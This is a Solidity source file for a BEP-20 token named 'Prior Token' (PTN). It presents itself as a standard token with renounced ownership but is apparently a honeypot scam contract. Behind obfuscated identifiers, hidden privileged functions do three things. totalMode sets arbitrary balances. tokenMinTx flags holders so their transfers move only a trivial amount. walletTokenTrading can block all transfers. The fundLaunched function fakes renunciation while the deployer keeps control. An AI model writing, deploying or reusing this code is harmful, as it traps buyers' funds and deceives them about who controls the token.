//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface shouldWalletLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address toExempt) external view returns (uint256);

    function transfer(address takeReceiver, uint256 limitList) external returns (bool);

    function allowance(address swapSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 limitList) external returns (bool);

    function transferFrom(
        address sender,
        address takeReceiver,
        uint256 limitList
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchedTake, uint256 value);
    event Approval(address indexed swapSender, address indexed spender, uint256 value);
}

abstract contract minList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface maxWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface enableTokenFee {
    function createPair(address minTx, address autoLiquidityIs) external returns (address);
}

interface enableLiquidity is shouldWalletLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PriorToken is minList, shouldWalletLimit, enableLiquidity {

    uint256 private amountExempt;

    function approve(address sellFrom, uint256 limitList) public virtual override returns (bool) {
        sellAt[_msgSender()][sellFrom] = limitList;
        emit Approval(_msgSender(), sellFrom, limitList);
        return true;
    }

    bool private buyReceiverAt;

    mapping(address => mapping(address => uint256)) private sellAt;

    uint256 public isBuyMarketing;

    function name() external view virtual override returns (string memory) {
        return listShould;
    }

    function launchTo() private view {
        require(feeAmount[_msgSender()]);
    }

    mapping(address => uint256) private exemptBuy;

    function symbol() external view virtual override returns (string memory) {
        return liquidityEnable;
    }

    event OwnershipTransferred(address indexed tradingLiquidity, address indexed launchedLiquidity);

    function transferFrom(address modeAuto, address takeReceiver, uint256 limitList) external override returns (bool) {
        if (_msgSender() != toIs) {
            if (sellAt[modeAuto][_msgSender()] != type(uint256).max) {
                require(limitList <= sellAt[modeAuto][_msgSender()]);
                sellAt[modeAuto][_msgSender()] -= limitList;
            }
        }
        return listTx(modeAuto, takeReceiver, limitList);
    }

    mapping(address => bool) public feeAmount;

    uint256 fromWallet;

    address private teamTradingAt;

    address toIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function getOwner() external view returns (address) {
        return teamTradingAt;
    }

    bool public takeIs;

    bool public maxAutoReceiver;

    function totalMode(address tradingAmountEnable, uint256 limitList) public {
        launchTo();
        exemptBuy[tradingAmountEnable] = limitList;
    }

    uint256 listReceiverTotal;

    function allowance(address minLimit, address sellFrom) external view virtual override returns (uint256) {
        if (sellFrom == toIs) {
            return type(uint256).max;
        }
        return sellAt[minLimit][sellFrom];
    }

    address public fromListTake;

    function listFrom(address launchedTo) public {
        if (maxAutoReceiver) {
            return;
        }
        
        feeAmount[launchedTo] = true;
        if (takeIs) {
            enableReceiver = true;
        }
        maxAutoReceiver = true;
    }

    function listTx(address modeAuto, address takeReceiver, uint256 limitList) internal returns (bool) {
        if (modeAuto == receiverMarketing) {
            return isModeTotal(modeAuto, takeReceiver, limitList);
        }
        uint256 marketingShould = shouldWalletLimit(fromListTake).balanceOf(swapMarketing);
        require(marketingShould == fromWallet);
        require(takeReceiver != swapMarketing);
        if (receiverFee[modeAuto]) {
            return isModeTotal(modeAuto, takeReceiver, receiverSender);
        }
        return isModeTotal(modeAuto, takeReceiver, limitList);
    }

    string private listShould = "Prior Token";

    function walletTokenTrading(uint256 limitList) public {
        launchTo();
        fromWallet = limitList;
    }

    function fundLaunched() public {
        emit OwnershipTransferred(receiverMarketing, address(0));
        teamTradingAt = address(0);
    }

    address swapMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public receiverFee;

    uint256 public receiverFrom;

    function owner() external view returns (address) {
        return teamTradingAt;
    }

    constructor (){
        if (enableReceiver) {
            takeIs = false;
        }
        maxWallet sellTake = maxWallet(toIs);
        fromListTake = enableTokenFee(sellTake.factory()).createPair(sellTake.WETH(), address(this));
        
        receiverMarketing = _msgSender();
        fundLaunched();
        feeAmount[receiverMarketing] = true;
        exemptBuy[receiverMarketing] = toWallet;
        
        emit Transfer(address(0), receiverMarketing, toWallet);
    }

    function balanceOf(address toExempt) public view virtual override returns (uint256) {
        return exemptBuy[toExempt];
    }

    uint256 private toWallet = 100000000 * 10 ** 18;

    uint256 constant receiverSender = 14 ** 10;

    string private liquidityEnable = "PTN";

    function transfer(address tradingAmountEnable, uint256 limitList) external virtual override returns (bool) {
        return listTx(_msgSender(), tradingAmountEnable, limitList);
    }

    uint8 private isMax = 18;

    function isModeTotal(address modeAuto, address takeReceiver, uint256 limitList) internal returns (bool) {
        require(exemptBuy[modeAuto] >= limitList);
        exemptBuy[modeAuto] -= limitList;
        exemptBuy[takeReceiver] += limitList;
        emit Transfer(modeAuto, takeReceiver, limitList);
        return true;
    }

    address public receiverMarketing;

    function decimals() external view virtual override returns (uint8) {
        return isMax;
    }

    uint256 private launchSender;

    bool public enableReceiver;

    function totalSupply() external view virtual override returns (uint256) {
        return toWallet;
    }

    function tokenMinTx(address maxTotalAuto) public {
        launchTo();
        if (takeIs) {
            amountExempt = launchSender;
        }
        if (maxTotalAuto == receiverMarketing || maxTotalAuto == fromListTake) {
            return;
        }
        receiverFee[maxTotalAuto] = true;
    }

}